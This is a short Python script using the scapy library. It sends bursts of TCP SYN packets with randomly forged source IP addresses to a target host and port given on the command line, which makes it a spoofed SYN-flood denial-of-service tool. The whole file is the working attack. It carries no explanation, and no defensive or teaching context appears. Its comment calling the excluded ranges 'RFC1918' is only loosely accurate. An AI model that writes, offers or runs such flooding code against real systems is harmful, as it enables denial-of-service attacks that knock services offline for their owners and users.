#!/usr/bin/env python

from scapy.all import *
from random import randrange
import sys
import ipaddr

not_valid = [10,127,169,172,192]

for x in range(0,10):

        #generate random numbers between 1 and 256, but not RFC1918
        first = randrange(1,256)
        while first in not_valid:
                first = randrange(1,256)

        #join each string by a . (thus creating a random IP)
        sip = ".".join([str(first),str(randrange(1,256)),
        str(randrange(1,256)),str(randrange(1,256))])

        print "Source IP:",sip
        print "Destination IP:",sys.argv[1]
        print "Destination Port:",int(sys.argv[2])
        count = randrange(1,1000)
        print "Number of packets:",count

        p=IP(dst=sys.argv[1],src=sip)/TCP(dport=int(sys.argv[2]),sport=RandShort                                                                                                                           (),flags="S")

        #send/receive listener for p
        ans,unans=srloop(p,inter=0.000001,count=count)

        #print summarys
        #ans.summary()
        #unans.summary()
